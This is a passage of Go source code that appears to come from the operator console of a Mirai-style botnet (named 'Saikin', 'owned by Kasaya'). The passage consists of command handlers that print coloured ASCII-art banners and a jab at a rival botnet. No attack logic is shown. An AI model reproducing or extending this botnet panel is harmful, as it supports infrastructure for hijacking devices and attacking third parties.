            this.conn.Write([]byte("\t\033[37m    |  |//|   \t\033[31m  ▒\033[36m   ██\033[31m▒░\033[36m██▄▄▄▄██ \033[31m▒\033[36m██   ██\033[31m░\t\033[37m      |  |//|   \r\n"))
            this.conn.Write([]byte("\t\033[37m    |  |//|   \t\033[31m▒\033[36m██████\033[31m▒▒ ▓\033[36m█   \033[31m▓\033[36m██\033[31m▒░ \033[36m████\033[31m▓▒░\t\033[37m      |  |//|   \r\n"))
            this.conn.Write([]byte("\t\033[37m    |  |//|   \t\033[31m▒ ▒▓▒ ▒ ░ ▒▒   ▓▒\033[36m█\033[31m░░ ▒░▒░▒░ \t\033[37m      |  |//|   \r\n"))
            this.conn.Write([]byte("\t\033[37m    |  |.-|   \t\033[31m░ ░▒  ░ ░  ▒   ▒▒ ░  ░ ▒ ▒░ \t\033[37m      |  |.-|   \r\n"))
            this.conn.Write([]byte("\t\033[37m    |.-'**|   \t\033[31m░  ░  ░    ░   ▒   ░ ░ ░ ▒  \t\033[37m      |.-'**|   \r\n"))
            this.conn.Write([]byte("\t\033[37m     \\***/    \t\033[31m      ░        ░  ░    ░ ░  \t\033[37m       \\***/    \r\n"))
            this.conn.Write([]byte("\t\033[37m      \\*/     \t                            \t\033[37m        \\*/     \r\n"))
            this.conn.Write([]byte("\t\033[37m       V      \t                            \t\033[37m         V      \r\n"))
            this.conn.Write([]byte("\t\033[37m      '       \t                            \t\033[37m        '       \r\n"))
            this.conn.Write([]byte("\t\033[37m       ^'     \t                            \t\033[37m         ^'     \r\n"))
            this.conn.Write([]byte("\t\033[37m      (_)     \t                            \t\033[37m        (_)     \r\n"))
            this.conn.Write([]byte("\t \r\n"))
            this.conn.Write([]byte("\t \r\n"))
            continue
        }
        if err != nil || cmd == ":hoho" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[1;31m\r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m        \033[1;31m  888    888  \033[1;36m        \r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m        \033[1;31m  888    888  \033[1;36m        \r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m        \033[1;31m  888    888  \033[1;36m        \r\n"))
            this.conn.Write([]byte("\033[1;31m             8888888888\033[1;36m  .d88b.\033[1;31m  8888888888  \033[1;36m.d88b.  \r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m d88\"\"88b\033[1;31m 888    888\033[1;36m d88\"\"88b \r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m 888  888\033[1;31m 888    888 \033[1;36m888  888 \r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m Y88..88P\033[1;31m 888    888 \033[1;36mY88..88P \r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m  \"Y88P\"\033[1;31m  888    888\033[1;36m  \"Y88P\"  \r\n"))
            this.conn.Write([]byte("\033[1;31m                    HoHo is Shit Lmfaooo \r\n"))
            continue

        }
        if err != nil || cmd == ":owari" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[0;96m                  \033[00;37m▒\033[\033[01;30m█████   █     █\033[00;37m░ \033[01;30m▄▄▄       \033[\033[01;30m██▀███   ██▓\r\n"))
            this.conn.Write([]byte("\033[0;96m                 \033[00;37m▒\033[\033[01;30m██\033[00;37m▒  \033[\033[01;30m██\033[00;37m▒\033[\033[01;30m▓█\033[00;37m░ \033[\033[01;30m█ \033[00;37m░\033[\033[01;30m█\033[00;37m░▒\033[\033[01;30m████▄    ▓██ \033[00;37m▒ \033[\033[01;30m██\033[00;37m▒\033[\033[01;30m▓██\033[00;37m▒\r\n"))
            this.conn.Write([]byte("\033[0;96m                 \033[00;37m▒\033[\033[01;30m██\033[00;37m░  \033[\033[01;30m██\033[00;37m▒▒\033[\033[01;30m█\033[00;37m░ \033[\033[01;30m█ \033[00;37m░\033[\033[01;30m█ \033[00;37m▒\033[\033[01;30m██  ▀█▄  ▓██ \033[00;37m░\033[\033[01;30m▄█ \033[00;37m▒▒\033[\033[01;30m██\033[00;37m▒\r\n"))
            this.conn.Write([]byte("\033[0;96m                 \033[00;37m\033[00;37m▒\033[\033[01;30m██   ██\033[00;37m░░\033[\033[01;30m█\033[00;37m░ \033[\033[01;30m█ \033[00;37m░\033[\033[01;30m█ \033[00;37m░\033[\033[01;30m██▄▄▄▄██ \033[00;37m▒\033[\033[01;30m██▀▀█▄  \033[00;37m░\033[\033[01;30m██\033[00;37m░\r\n"))
            this.conn.Write([]byte("\033[0;96m                 \033[00;37m░ \033[01;30m████▓\033[00;37m▒░░░\033[01;30m██\033[00;37m▒\033[01;30m██▓  ▓█   ▓██\033[00;37m▒░\033[01;30m██▓\033[00;37m ▒\033[01;30m██\033[00;37m▒░\033[01;30m██\033[00;37m░\r\n"))
            this.conn.Write([]byte("\033[0;96m                 \033[00;37m░ ▒░▒░▒░ ░ \033[01;30m▓\033[00;37m░▒ ▒   ▒▒   \033[01;30m▓\033[00;37m▒\033[01;30m█\033[00;37m░░ ▒\033[01;30m▓\033[00;37m ░▒\033[01;30m▓\033[00;37m░░\033[01;30m▓  \r\n"))
            this.conn.Write([]byte("\033[0;96m                 \033[00;37m  ░ ▒ ▒░   ▒ ░ ░    ▒   ▒▒ ░  ░▒ ░ ▒░ ▒ ░\r\n"))
            this.conn.Write([]byte("\033[0;97m                 \033[00;37m░ ░ ░ ▒    ░   ░    ░   ▒     ░░   ░  ▒ ░\r\n"))
            this.conn.Write([]byte("\033[0;97m                 \033[00;37m    ░ ░      ░          ░  ░   ░      ░  \r\n"))
            continue
        }
        if err != nil || cmd == ":sora" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("                      \033[01;30m   ██████  \033[00;37m▒\033[01;30m█████   ██▀███   ▄▄▄      \r\n"))
            this.conn.Write([]byte("                       \033[00;37m▒\033[01;30m██    \033[00;37m▒ ▒\033[01;30m██\033[00;37m▒  \033[01;30m██\033[00;37m▒▓\033[01;30m██ \033[00;37m▒ \033[01;30m██\033[00;37m▒▒\033[01;30m████▄    \r\n"))
            this.conn.Write([]byte("                       \033[00;37m░ ▓\033[01;30m██▄   \033[00;37m▒\033[01;30m██\033[00;37m░  \033[01;30m██\033[00;37m▒▓\033[01;30m██ \033[00;37m░\033[01;30m▄█ \033[00;37m▒▒\033[01;30m██  ▀█▄  \r\n"))
            this.conn.Write([]byte("                       \033[00;37m  ▒   \033[01;30m██\033[00;37m▒▒\033[01;30m██   ██\033[00;37m░▒\033[01;30m██▀▀█▄  \033[00;37m░\033[01;30m██▄▄▄▄██ \r\n"))
            this.conn.Write([]byte("                       \033[00;37m▒\033[01;30m██████\033[00;37m▒▒░ \033[01;30m████\033[00;37m▓▒░░\033[01;30m██\033[00;37m▓ ▒\033[01;30m██\033[00;37m▒ ▓\033[01;30m█   \033[00;37m▓\033[01;30m██\033[00;37m▒\r\n"))
            this.conn.Write([]byte("                       \033[01;30m▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░\r\n"))
            this.conn.Write([]byte("                      \033[01;30m ░ ░▒  ░ ░  ░ ▒ ▒░   ░▒ ░ ▒░  ▒   ▒▒ ░\r\n"))
            this.conn.Write([]byte("                       \033[01;30m░  ░  ░  ░ ░ ░ ▒    ░░   ░   ░   ▒   \r\n"))
            this.conn.Write([]byte("                       \033[01;30m      ░      ░ ░     ░           ░  ░\r\n"))
            continue
        }
        if err != nil || cmd == ":mickey" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[1;90m                                                                                                                                                             \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                                       \033[90m.::`:`:`:.                                                      \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                                      \033[90m:.:.:.:.:.::.                                                    \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                                      \033[90m::.:.:.:.:.:.:                                                   \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                                      \033[90m`.:.:.:.:.:.:'                                                   \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                                 ,,\033[90m.::::.:.:.:.:.:'                                                    \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                      \033[97m.,,.                   \033[38;5;216m.,<?3$;e$$$$e\033[90m:.:.```                                    \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                    \033[97m,d$$$P            \033[90m.::. \033[38;5;216m,JP?$$$$$$,?$$$>\033[90m:.:`:    .,:,.                      \r\n"))
            this.conn.Write([]byte("\033[1;90m                                         \033[97m_..,,,,.. ,?$$$>            \033[90m:.:*:.\033[38;5;216mF;$>$P?T$$$,$$$>\033[90m.:.:.:.::.:.:.::                    \r\n"))
            this.conn.Write([]byte("\033[1;90m         ____________________          \033[97m,<<<????9F$$$$$$$$>            \033[90m`:.:.\033[38;5;216m;  \033[90m)\033[38;5;216mdF<$>3$$$$$F\033[90m.:.:.:.::.:.:.:.::\r\n"))
            this.conn.Write([]byte("\033[1;90m                                     \033[97mue<d<d<ed'dP????$$$$,             \033[38;5;216mu;e$bcRF  \033[90m)\033[38;5;216mJ$$$$$'\033[90m.:.:.:.::.:.:.:.:.:       \r\n"))
            this.conn.Write([]byte("\033[1;90m                \033[95mミッキー           \033[97m'<e<e<e<d'd$$$$$$$$$$$b            \033[38;5;216m$$$$$$$$oe$$$$$F\033[90m:.:.:.:.::.:.:.:.:.:'                       \r\n"))
            this.conn.Write([]byte("\033[1;90m         ____________________        \033[97m`??$$$???4$$$$$$$$$$F\033[90m::::..        \033[38;5;216m?$$$$$$$$$$$$$$$$$$b\033[90m.:.:: `.:.:.:.:'                   \r\n"))
            this.conn.Write([]byte("\033[1;90m           \033[01;35mViVi \033[1;90mby \033[95mKasaya                       \033[97m``'????$$b;\033[90m:::::::d$$$$$c`\033[38;5;216m?$$$$$$$$F u($$$$$>\033[90m.:'    `'''`                 \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                            \033[90m`':::J$$$$$$$$bo\033[38;5;216m`\";_,\033[38;5;216meed$$$$$$P                                    \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                \033[90m?$$$$$$$F$Fi,\033[38;5;216m''``'????''                                                   \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                \033[90m`?$$?$$'d>???b`'e$$$$'$$$c                                                             \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                  \033[90m`'` .$$$$$$c.ee'?$'d$$$$$o.                                                          \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                     \033[90m.$$$$$$$$$$$$L,$$$$$$$$$bu                                                        \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                    \033[90m.$$$$$$$$$$$$$$$$'?$$$$$P\033[90m::.                                                 \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                    \033[90md$$$$$$$$$$$$$$`'  ?$$F\033[90m::::::.                                               \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                   \033[90m.$$$$$$$$$$$$`\033[97mod$bee.\033[90m`` .::::::                                         \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                    \033[90m$$$$$$$$$$$ \033[97mPLo$$$\033[90m:::::::::''                                          \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                    \033[90m'$$$$$$$$$>\033[97m<`uJF$$;\033[90m::''''                                              \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                   \033[31m`e``?$$$$PF,\033[97m`$bJJ$$br                                                         \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                    \033[31m$$$$eeee$$$o.\033[97m`????`                                                          \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                    \033[31m`$$$$E?$P$$$$$$$k                                                                  \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                     \033[31m'$$$$bi`?$$$$$$P                                                                  \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                      \033[31m`?$$$$$$ec,`??`                                                                  \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                        \033[31m'$$$$$$$$$$$$:...                                                              \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                          \033[31m'?$$$$$$$$P:::$b,.                                                           \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                             \033[31m'?R$$$P;::z$$;$b.                                                         \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                \033[93m.zd$$$$bo;'?bJ>;;:u.'?$??;d$$$.                                                        \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                              \033[93m.d$$$$$$$$$$$$d$$P?''.uooo,>?$$$                                                         \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                              \033[93m4$$$$$$$$$$$$$$`,e$$$$$$$$$$$$$P                                                         \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                               \033[93m`?R$$$$$$$$$$`d$$$$$$$$$$$$$$P                                                          \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                    \033[93m`'''''`  `R$$$$$$$$$$$P'                                                           \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                               \033[93m`'??????``                                                              \r\n"))
            continue
        }
        if err != nil || cmd == ":dood" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[1;31m                \r\n"))
            this.conn.Write([]byte("\033[1;31m      ``````¶0````1¶1_```````````````````````````````````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ```````¶¶¶0_`_¶¶¶0011100¶¶¶¶¶¶¶001_````````````````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ````````¶¶¶¶¶00¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶0_````````````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      `````1_``¶¶00¶0000000000000000000000¶¶¶¶0_`````````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      `````_¶¶_`0¶000000000000000000000000000¶¶¶¶¶1``````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ```````¶¶¶00¶00000000000000000000000000000¶¶¶_`````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ````````_¶¶00000000000000000000¶¶00000000000¶¶`````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      `````_0011¶¶¶¶¶000000000000¶¶00¶¶0¶¶00000000¶¶_````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ```````_¶¶¶¶¶¶¶00000000000¶¶¶¶0¶¶¶¶¶00000000¶¶1````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ``````````1¶¶¶¶¶000000¶¶0¶¶¶¶¶¶¶¶¶¶¶¶0000000¶¶¶````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ```````````¶¶¶0¶000¶00¶0¶¶`_____`__1¶0¶¶00¶00¶¶````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ```````````¶¶¶¶¶00¶00¶10¶0``_1111_`_¶¶0000¶0¶¶¶````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ``````````1¶¶¶¶¶00¶0¶¶_¶¶1`_¶_1_0_`1¶¶_0¶0¶¶0¶¶````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ````````1¶¶¶¶¶¶¶0¶¶0¶0_0¶``100111``_¶1_0¶0¶¶_1¶````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ```````1¶¶¶¶00¶¶¶¶¶¶¶010¶``1111111_0¶11¶¶¶¶¶_10````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ```````0¶¶¶¶__10¶¶¶¶¶100¶¶¶0111110¶¶¶1__¶¶¶¶`__````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ```````¶¶¶¶0`__0¶¶0¶¶_¶¶¶_11````_0¶¶0`_1¶¶¶¶```````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ```````¶¶¶00`__0¶¶_00`_0_``````````1_``¶0¶¶_```````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ``````1¶1``¶¶``1¶¶_11``````````````````¶`¶¶````````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ``````1_``¶0_¶1`0¶_`_``````````_``````1_`¶1````````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ``````````_`1¶00¶¶_````_````__`1`````__`_¶`````````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ````````````¶1`0¶¶_`````````_11_`````_``_``````````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      `````````¶¶¶¶000¶¶_1```````_____```_1``````````````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      `````````¶¶¶¶¶¶¶¶¶¶¶¶0_``````_````_1111__``````````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      `````````¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶01_`````_11____1111_```````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      `````````¶¶0¶0¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1101_______11¶_```````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ``````_¶¶¶0000000¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶0¶0¶¶¶1````````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      `````0¶¶0000000¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1`````````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ````0¶0000000¶¶0_````_011_10¶110¶01_1¶¶¶0````_100¶001_`        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ```1¶0000000¶0_``__`````````_`````````0¶_``_00¶¶010¶001        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ```¶¶00000¶¶1``_01``_11____``1_``_`````¶¶0100¶1```_00¶1        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ``1¶¶00000¶_``_¶_`_101_``_`__````__````_0000001100¶¶¶0`        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ``¶¶¶0000¶1_`_¶``__0_``````_1````_1_````1¶¶¶0¶¶¶¶¶¶0```        \r\n"))
            this.conn.Write([]byte("\033[1;31m      `_¶¶¶¶00¶0___01_10¶_``__````1`````11___`1¶¶¶01_````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      `1¶¶¶¶¶0¶0`__01¶¶¶0````1_```11``___1_1__11¶000`````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      `1¶¶¶¶¶¶¶1_1_01__`01```_1```_1__1_11___1_``00¶1````````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ``¶¶¶¶¶¶¶0`__10__000````1____1____1___1_```10¶0_```````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ``0¶¶¶¶¶¶¶1___0000000```11___1__`_0111_```000¶01```````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ```¶¶¶00000¶¶¶¶¶¶¶¶¶01___1___00_1¶¶¶`_``1¶¶10¶¶0```````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ```1010000¶000¶¶0100_11__1011000¶¶0¶1_10¶¶¶_0¶¶00``````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      10¶000000000¶0________0¶000000¶¶0000¶¶¶¶000_0¶0¶00`````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ¶¶¶¶¶¶0000¶¶¶¶_`___`_0¶¶¶¶¶¶¶00000000000000_0¶00¶01````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ¶¶¶¶¶0¶¶¶¶¶¶¶¶¶_``_1¶¶¶00000000000000000000_0¶000¶01```        \r\n"))
            this.conn.Write([]byte("\033[1;31m      1__```1¶¶¶¶¶¶¶¶¶00¶¶¶¶00000000000000000000¶_0¶0000¶0_``        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ```````¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶00000000000000000000010¶00000¶¶_`        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ```````0¶¶¶¶¶¶¶¶¶¶¶¶¶¶00000000000000000000¶10¶¶0¶¶¶¶¶0`        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ````````¶¶¶¶¶¶¶¶¶¶0¶¶¶00000000000000000000010¶¶¶0011```        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ````````1¶¶¶¶¶¶¶¶¶¶0¶¶¶0000000000000000000¶100__1_`````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      `````````¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶000000000000000000¶11``_1``````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      `````````1¶¶¶¶¶¶¶¶¶¶¶0¶¶¶00000000000000000¶11___1_`````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ``````````¶¶¶¶¶¶0¶0¶¶¶¶¶¶¶0000000000000000¶11__``1_````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ``````````¶¶¶¶¶¶¶0¶¶¶0¶¶¶¶¶000000000000000¶1__````__```        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ``````````¶¶¶¶¶¶¶¶0¶¶¶¶¶¶¶¶¶0000000000000000__`````11``        \r\n"))
            this.conn.Write([]byte("\033[1;31m      `````````_¶¶¶¶¶¶¶¶¶000¶¶¶¶¶¶¶¶000000000000011_``_1¶¶¶0`        \r\n"))
            this.conn.Write([]byte("\033[1;31m      `````````_¶¶¶¶¶¶0¶¶000000¶¶¶¶¶¶¶000000000000100¶¶¶¶0_`_        \r\n"))
            this.conn.Write([]byte("\033[1;31m      `````````1¶¶¶¶¶0¶¶¶000000000¶¶¶¶¶¶000000000¶00¶¶01`````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      `````````¶¶¶¶¶0¶0¶¶¶0000000000000¶0¶00000000011_``````_        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ````````1¶¶0¶¶¶0¶¶¶¶¶¶¶000000000000000000000¶11___11111        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ````````¶¶¶¶0¶¶¶¶¶00¶¶¶¶¶¶000000000000000000¶011111111_        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ```````_¶¶¶¶¶¶¶¶¶0000000¶0¶00000000000000000¶01_1111111        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ```````0¶¶¶¶¶¶¶¶¶000000000000000000000000000¶01___`````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ```````¶¶¶¶¶¶0¶¶¶000000000000000000000000000¶01___1````        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ``````_¶¶¶¶¶¶¶¶¶00000000000000000000000000000011_111```        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ``````0¶¶0¶¶¶0¶¶0000000000000000000000000000¶01`1_11_``        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ``````¶¶¶¶¶¶0¶¶¶0000000000000000000000000000001`_0_11_`        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ``````¶¶¶¶¶¶¶¶¶00000000000000000000000000000¶01``_0_11`        \r\n"))
            this.conn.Write([]byte("\033[1;31m      ``````¶¶¶¶0¶¶¶¶00000000000000000000000000000001```_1_11        \r\n"))
            continue
        }
        if err != nil || cmd == ":kitty" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[1;95m          \r\n"))
            this.conn.Write([]byte("\033[1;95m                __                             ___            _aaaa           \r\n"))
            this.conn.Write([]byte("\033[1;95m               d8888aa,_                    a8888888a   __a88888888b           \r\n"))
            this.conn.Write([]byte("\033[1;95m              d8P   `Y88ba.                a8P'~~~~Y88a888P~~~~~~Y88b           \r\n"))
            this.conn.Write([]byte("\033[1;95m             d8P      ~~Y88a____aaaaa_____a8P        888          Y88           \r\n"))
            this.conn.Write([]byte("\033[1;95m            d8P          ~Y88~8~~~~~~~88888P          88g          88           \r\n"))
            this.conn.Write([]byte("\033[1;95m           d8P                           88      ____ _88y__       88b           \r\n"))
            this.conn.Write([]byte("\033[1;95m           88                           a88    _a88~8888 8M88a_____888           \r\n"))
            this.conn.Write([]byte("\033[1;95m           88                           88P    88  a8       `888888888b_           \r\n"))
            this.conn.Write([]byte("\033[1;95m          a8P                           88     88 a88         88b     Y8,           \r\n"))
            this.conn.Write([]byte("\033[1;95m           8b                           88      8888P         388      88b           \r\n"))
            this.conn.Write([]byte("\033[1;95m          a88a                          Y8b       88L         8888.    88P           \r\n"))
            this.conn.Write([]byte("\033[1;95m         a8P                             Y8_     _888       _a8P 88   a88           \r\n"))
            this.conn.Write([]byte("\033[1;95m        _8P                               ~Y88a888~888g_   a888yg8   a88            \r\n"))
            this.conn.Write([]byte("\033[1;95m        88                                   ~~~~    ~  8888        a88P           \r\n"))
            this.conn.Write([]byte("\033[1;95m       d8                                                 Y8,      888L           \r\n"))
            this.conn.Write([]byte("\033[1;95m       8E                                                  88a___a8 888           \r\n"))
            this.conn.Write([]byte("\033[1;95m      d8P                                                   ~Y888    88L           \r\n"))
            this.conn.Write([]byte("\033[1;95m      88                                                      ~~      88           \r\n"))
            this.conn.Write([]byte("\033[1;95m      88                                                              88           \r\n"))
            this.conn.Write([]byte("\033[1;95m      88                                                              88b           \r\n"))
            this.conn.Write([]byte("\033[1;95m  ____88a_.      a8a                                                __881           \r\n"))
            this.conn.Write([]byte("\033[1;95m88  P~888        888b                                 __          8888888888           \r\n"))
            this.conn.Write([]byte("\033[1;95m      888        888P                                d88b             88           \r\n"))
            this.conn.Write([]byte("\033[1;95m     _888ba       ~            aaaa.                 8888            d8P           \r\n"))
            this.conn.Write([]byte("\033[1;95m a888~ Y88                    BBBBBB                  8P          8aa888_           \r\n"))
            this.conn.Write([]byte("\033[1;95m        Y8b                   Y888P                                 88  888a           \r\n"))
            this.conn.Write([]byte("\033[1;95m        _88gB                   ~~~                                 a88    ~~           \r\n"))
            this.conn.Write([]byte("\033[1;95m    __a8 888_                                                  a_ a88           \r\n"))
            this.conn.Write([]byte("\033[1;95m   88       88g                                                  888g_           \r\n"))
            this.conn.Write([]byte("\033[1;95m   ~          88a_                                            _a88  Y88gg,           \r\n"))
            this.conn.Write([]byte("\033[1;95m                 888aa_.                                   _a88        ~88           \r\n"))
            this.conn.Write([]byte("\033[1;95m                   ~~  8888aaa______                ____a888P            \r\n"))
            this.conn.Write([]byte("\033[1;95m                           ~~~~~~888888888888888888~~~~~           \r\n"))
            this.conn.Write([]byte("\033[1;95m                                      ~~~~~~~~~~~~           \r\n"))
            continue
        }
        if err != nil || cmd == ":saikin" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[0;35m\r\n"))
            this.conn.Write([]byte("\033[1;30m         This Net is Owned by Kasaya\r\n\033[0m"))
            this.conn.Write([]byte("\033[1;35m\r\n"))
            this.conn.Write([]byte("\033[1;96m           ███████╗ █████╗ ██╗██╗  ██╗██╗███╗   ██╗\r\n"))
            this.conn.Write([]byte("\033[1;96m           ██╔════╝██╔══██╗██║██║ ██╔╝██║████╗  ██║\r\n"))
            this.conn.Write([]byte("\033[1;96m           ███████╗███████║██║█████╔╝ ██║██╔██╗ ██║\r\n"))    
            this.conn.Write([]byte("\033[1;96m           ╚════██║██╔══██║██║██╔═██╗ ██║██║╚██╗██║\r\n"))
            this.conn.Write([]byte("\033[1;96m           ███████║██║  ██║██║██║  ██╗██║██║ ╚████║\r\n"))
            this.conn.Write([]byte("\033[1;96m           ╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝\r\n"))
            this.conn.Write([]byte("\x1b[0;36m                       \x1b[1;35m[\x1b[1;32m+\x1b[1;35m]\x1b[0;94mVersion 8\x1b[1;35m[\x1b[1;32m+\x1b[1;35m]\r\n\x1b[0m"))
            continue
        }
        if err != nil || cmd == ":timeout" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[0;35m             \r\n"))
            this.conn.Write([]byte("\033[1;30m             \r\n\033[0m"))
            this.conn.Write([]byte("\033[1;92m            ████████\033[95m╗\033[92m██\033[95m╗\033[92m███\033[95m╗   \033[92m███\033[95m╗\033[92m███████\033[95m╗ \033[92m██████\033[95m╗ \033[92m██\033[95m╗   \033[92m██\033[95m╗\033[92m████████\033[95m╗      \r\n"))
            this.conn.Write([]byte("\033[1;95m            ╚══██╔══╝██║████╗ ████║██╔════╝██╔═══██╗██║   ██║╚══██╔══╝      \r\n"))
            this.conn.Write([]byte("\033[1;92m               ██\033[95m║   \033[92m██\033[95m║\033[92m██\033[95m╔\033[92m████\033[95m╔\033[92m██\033[95m║\033[92m█████\033[95m╗  \033[92m██\033[95m║   \033[92m██\033[95m║\033[92m██\033[95m║   \033[92m██\033[95m║   \033[92m██\033[95m║         \r\n"))
            this.conn.Write([]byte("\033[1;92m               ██\033[95m║   \033[92m██\033[95m║\033[92m██\033[95m║╚\033[92m██\033[95m╔╝\033[92m██\033[95m║\033[92m██\033[95m╔══╝  \033[92m██\033[95m║   \033[92m██\033[95m║\033[92m██\033[95m║   \033[92m██\033[95m║   \033[92m██\033[95m║         \r\n"))    
            this.conn.Write([]byte("\033[1;92m               ██\033[95m║   \033[92m██\033]95m║\033[92m ██\033[95m║ ╚═╝ \033[92m██\033[95m║\033[92m███████\033[95m╗╚\033[92m██████\033[95m╔╝╚\033[92m██████\033[95m╔╝   \033[92m██\033[95m║         \r\n"))
            this.conn.Write([]byte("\033[1;95m               ╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝ ╚═════╝  ╚═════╝    ╚═╝         \r\n"))
            this.conn.Write([]byte("\033[1;92m             \r\n"))
            this.conn.Write([]byte("\x1b[0;37m             \r\n\x1b[0m"))
            continue
        }
        if err != nil || cmd == ":xanax" {
